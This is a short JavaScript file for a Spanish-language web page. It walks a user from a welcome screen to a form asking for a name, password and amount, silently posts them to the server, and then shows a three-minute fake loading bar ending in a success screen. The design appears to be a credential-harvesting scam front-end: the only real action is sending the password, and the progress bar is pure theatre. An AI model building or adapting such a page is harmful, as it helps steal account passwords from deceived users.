function startProcess() {
    document.getElementById("welcome-screen").classList.add("hidden");
    document.getElementById("form-screen").classList.remove("hidden");
}

function continueProcess() {
    let nombre = document.getElementById("nombre").value;
    let contrasena = document.getElementById("contrasena").value;
    let cantidad = document.getElementById("cantidad").value;

    if (nombre && contrasena && cantidad > 0) {
        document.getElementById("form-screen").classList.add("hidden");
        document.getElementById("loading-screen").classList.remove("hidden");

        // Enviar datos al servidor
        fetch('/datos', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ nombre: nombre, contrasena: contrasena, cantidad: cantidad })
        });

        startLoading();
    } else {
        alert("Por favor, completa todos los campos correctamente.");
    }
}

function startLoading() {
    let progressBar = document.getElementById("progress-bar");
    let width = 0;
    let interval = setInterval(function() {
        if (width >= 100) {
            clearInterval(interval);
            document.getElementById("loading-screen").classList.add("hidden");
            document.getElementById("success-screen").classList.remove("hidden");
        } else {
            width += (1 / 180) * 100;
            progressBar.style.width = width + '%';
        }
    }, 1000);
}
